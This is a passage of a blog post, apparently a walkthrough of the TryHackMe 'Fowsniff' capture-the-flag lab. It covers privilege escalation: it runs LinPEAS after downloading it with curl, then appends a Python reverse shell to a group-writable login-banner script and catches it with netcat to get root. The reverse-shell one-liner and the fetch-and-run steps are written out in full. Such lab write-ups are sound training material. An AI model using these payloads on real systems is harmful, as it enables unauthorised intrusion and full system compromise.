+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> baksteen baksteen  <span class="m">220</span> Sep  <span class="m">1</span>  <span class="m">2015</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> baksteen baksteen <span class="m">3771</span> Sep  <span class="m">1</span>  <span class="m">2015</span> .bashrc
+</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> baksteen baksteen <span class="m">4096</span> Mar <span class="m">13</span>  <span class="m">2018</span> .cache
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> baksteen baksteen <span class="m">4096</span> Mar <span class="m">13</span>  <span class="m">2018</span> Maildir
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> baksteen baksteen  <span class="m">655</span> May <span class="m">16</span>  <span class="m">2017</span> .profile
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> baksteen baksteen   <span class="m">78</span> Mar <span class="m">13</span>  <span class="m">2018</span> term.txt
+</span></span></code></pre></div><p>Let&rsquo;s check the user flag:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat term.txt
+</span></span></code></pre></div><p>This isn&rsquo;t the main flag - we need to escalate to root privileges.</p>
+
+<h2 class="relative group">Phase 5: Privilege Escalation 
+    <div id="phase-5-privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#phase-5-privilege-escalation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">What is Privilege Escalation? 
+    <div id="what-is-privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-is-privilege-escalation" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>Privilege escalation</strong> is the process of gaining higher-level permissions on a system. We currently have access as the user <code>baksteen</code>, but we want root access to get the final flag.</p>
+
+<h3 class="relative group">Step 9: System Enumeration with LinPEAS 
+    <div id="step-9-system-enumeration-with-linpeas" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-9-system-enumeration-with-linpeas" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is LinPEAS?</strong> LinPEAS (Linux Privilege Escalation Awesome Script) is an automated tool that scans for common privilege escalation vectors on Linux systems.</p>
+<p>Let&rsquo;s download and run LinPEAS:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Download LinPEAS to the target machine</span>
+</span></span><span class="line"><span class="cl">curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Make it executable</span>
+</span></span><span class="line"><span class="cl">chmod +x linpeas.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Run it</span>
+</span></span><span class="line"><span class="cl">./linpeas.sh
+</span></span></code></pre></div><p><em>Alternative download method if curl doesn&rsquo;t work:</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+</span></span></code></pre></div><p><strong>Key Finding from LinPEAS:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Interesting GROUP writable files <span class="o">(</span>not in Home<span class="o">)</span> <span class="o">(</span>max 200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  Group users:
+</span></span><span class="line"><span class="cl">/opt/cube/cube.sh
+</span></span></code></pre></div><p>This is interesting! Let&rsquo;s investigate this file.</p>
+
+<h3 class="relative group">Step 10: Analyzing the Writable Script 
+    <div id="step-10-analyzing-the-writable-script" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-10-analyzing-the-writable-script" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -la /opt/cube/cube.sh
+</span></span></code></pre></div><p><strong>Output:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-rw-rwxr-- <span class="m">1</span> parede users <span class="m">851</span> Mar <span class="m">11</span>  <span class="m">2018</span> /opt/cube/cube.sh
+</span></span></code></pre></div><p><strong>Understanding File Permissions:</strong></p>
+<ul>
+<li><code>rw-</code> (owner: parede) - Read and write permissions</li>
+<li><code>rwx</code> (group: users) - Read, write, and execute permissions</li>
+<li><code>r--</code> (others) - Read only</li>
+</ul>
+<p><strong>Why is this important?</strong></p>
+<ol>
+<li>We are part of the <code>users</code> group</li>
+<li>The <code>users</code> group has write access to this script</li>
+<li>This script likely runs with elevated privileges</li>
+</ol>
+<p>Let&rsquo;s see what this script does:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /opt/cube/cube.sh
+</span></span></code></pre></div><p>This script appears to generate the banner we saw when logging in via SSH. If it runs as root during login, we can modify it to give us a root shell!</p>
+
+<h3 class="relative group">Step 11: Creating a Reverse Shell 
+    <div id="step-11-creating-a-reverse-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-11-creating-a-reverse-shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p><strong>What is a Reverse Shell?</strong> A reverse shell is when the target machine connects back to our attacking machine, giving us a command prompt. This is useful because:</p>
+<ol>
+<li>It bypasses firewall restrictions</li>
+<li>We can catch it with a simple listener</li>
+<li>If the script runs as root, we get a root shell</li>
+</ol>
+<p>First, let&rsquo;s set up a listener on our attacking machine (in a new terminal):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
+</span></span></code></pre></div><p><strong>Command breakdown:</strong></p>
+<ul>
+<li><code>nc</code> - Netcat</li>
+<li><code>-l</code> - Listen mode</li>
+<li><code>-v</code> - Verbose output</li>
+<li><code>-n</code> - Don&rsquo;t resolve hostnames</li>
+<li><code>-p 4444</code> - Listen on port 4444</li>
+</ul>
+<p>Now, let&rsquo;s modify the script to include our reverse shell. We need to add a Python reverse shell to the script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># First, let&#39;s backup the original script</span>
+</span></span><span class="line"><span class="cl">cp /opt/cube/cube.sh /opt/cube/cube.sh.backup
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Add our reverse shell to the script (replace 10.9.x.x with YOUR IP)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;python3 -c &#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;10.9.x.x\&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#34;&#39;</span> &gt;&gt; /opt/cube/cube.sh
+</span></span></code></pre></div><p><strong>To find your IP address (attacking machine):</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip addr show tun0
+</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
+</span></span><span class="line"><span class="cl">ifconfig tun0
+</span></span></code></pre></div><p>Look for your TryHackMe VPN IP address (usually starts with 10.x.x.x).</p>
+
+<h3 class="relative group">Step 12: Triggering the Reverse Shell 
+    <div id="step-12-triggering-the-reverse-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-12-triggering-the-reverse-shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>The script runs when someone logs in via SSH. Let&rsquo;s trigger it by opening a new SSH session to the same machine:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In a new terminal, SSH again</span>
+</span></span><span class="line"><span class="cl">ssh baksteen@10.10.4.101
+</span></span></code></pre></div><p><strong>Check your netcat listener</strong> - you should see a connection!</p>
+<p><strong>Example successful connection:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Listening on 0.0.0.0 <span class="m">4444</span>
+</span></span><span class="line"><span class="cl">Connection received on 10.10.4.101 <span class="m">45944</span>
+</span></span><span class="line"><span class="cl">/bin/sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl"><span class="c1"># </span>
+</span></span></code></pre></div><p>Congratulations! You now have root access!</p>
+
+<h3 class="relative group">Step 13: Capturing the Flag 
+    <div id="step-13-capturing-the-flag" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#step-13-capturing-the-flag" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Find the flag</span>
+</span></span><span class="line"><span class="cl">find / -name <span class="s2">&#34;flag.txt&#34;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="c1"># or</span>
+</span></span><span class="line"><span class="cl">ls /root
+</span></span></code></pre></div><p><strong>Read the root flag:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /root/flag.txt
+</span></span></code></pre></div><p><strong>Flag Output:</strong></p>
+<pre tabindex="0"><code>   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ &#39; \/ _` | &#39;_/ _` |  _| || | / _` |  _| / _ \ &#39; \(_-&lt;_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|
+  |    R O O T   |
+  |    F L A G   |
+  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+</code></pre>
+<h2 class="relative group">Summary and Key Learning Points 
+    <div id="summary-and-key-learning-points" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#summary-and-key-learning-points" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+<h3 class="relative group">What We Accomplished: 
+    <div id="what-we-accomplished" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#what-we-accomplished" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>Network enumeration</strong> - Used Nmap to discover open services</li>
+<li><strong>OSINT research</strong> - Found leaked credentials online</li>
+<li><strong>Hash cracking</strong> - Converted password hashes to plaintext</li>
+<li><strong>Email exploitation</strong> - Accessed POP3 emails for sensitive information</li>
+<li><strong>Brute force attack</strong> - Used Hydra to find SSH credentials</li>
+<li><strong>Privilege escalation</strong> - Exploited writable system files</li>
+<li><strong>Reverse shell</strong> - Gained root access through script modification</li>
+</ol>
+
+<h3 class="relative group">Security Lessons: 
+    <div id="security-lessons" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#security-lessons" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ol>
+<li><strong>Password reuse is dangerous</strong> - The same passwords were used across multiple services</li>
+<li><strong>Default passwords must be changed</strong> - The temporary SSH password wasn&rsquo;t changed</li>
+<li><strong>File permissions matter</strong> - Group-writable system files are dangerous</li>
+<li><strong>Information disclosure</strong> - Sensitive information in emails can be exploited</li>
+<li><strong>Data breaches have lasting impact</strong> - Old breached credentials are still valuable</li>
+</ol>
+<p>This CTF is an excellent introduction to penetration testing methodology and demonstrates how multiple small vulnerabilities can be chained together for complete system compromise.</p>
+<p>Remember: Practice makes perfect! Try similar CTF challenges to reinforce these skills.</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/posts/2025-08-22-fowsniff/&amp;title=Fowsniff"
+          title="Share on LinkedIn"
+          aria-label="Share on LinkedIn">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://twitter.com/intent/tweet/?url=http://localhost:1313/posts/2025-08-22-fowsniff/&amp;text=Fowsniff"
+          title="Tweet on Twitter"
+          aria-label="Tweet on Twitter">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
+        </a>
+      
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://api.whatsapp.com/send?text=http://localhost:1313/posts/2025-08-22-fowsniff/&amp;resubmit=true&amp;title=Fowsniff"
+          title="Share via WhatsApp"
+          aria-label="Share via WhatsApp">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://reddit.com/submit/?url=http://localhost:1313/posts/2025-08-22-fowsniff/&amp;resubmit=true&amp;title=Fowsniff"
+          title="Submit to Reddit"
+          aria-label="Submit to Reddit">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+</span>
+        </a>
+      
+    
+      
+        <a
+          target="_blank"
+          class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+          href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/posts/2025-08-22-fowsniff/&amp;quote=Fowsniff"
+          title="Share on Facebook"
+          aria-label="Share on Facebook">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+</span>
+        </a>
+      
+    
+  </section>
+
+
+        
+
+      </div>
+
+      
+      
+        
+        
+          
+          
+        
+        
+        
+        <script
+          type="text/javascript"
+          src="/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js"
+          integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA=="
+          data-oid="views_posts/2025-08-22-FowSniff.md"
+          data-oid-likes="likes_posts/2025-08-22-FowSniff.md"></script>
+      
+    </section>
+
+    
+    <footer class="pt-8 max-w-prose print:hidden">
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600">
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/2024-11-29-dnadesign/2024-11-29-dnadesign/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >DNA & Design</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-11-29T01:09:33&#43;03:00">29 November 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/2025-08-28-three/2025-08-28-three/">
+              <span class="flex flex-col">
+                <span class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Three</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2025-08-28T01:09:33&#43;03:00">28 August 2025</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+        <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0 z-10">
+  <a
+    href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top"
+    title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+
+      </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+    
+    
+      <p class="text-sm text-neutral-500 dark:text-neutral-400">
+          © 2025 HushKat. All rights reserved.
+      </p>
+    
+
+    
+    
+      <p class="text-xs text-neutral-500 dark:text-neutral-400">
+        
+        
+        Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+          href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+      </p>
+    
+  </div>
+  
+    <script>
+      mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+        margin: 24,
+        background: "rgba(0,0,0,0.5)",
+        scrollOffset: 0,
+      });
+    </script>
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js"
+    integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+    <a rel="me" href="https://masto.ai/@blowfish"></a>
+
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500"
+  data-url="http://localhost:1313/">
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800">
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0">
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+    </div>
+  </body>
+  
+</html>
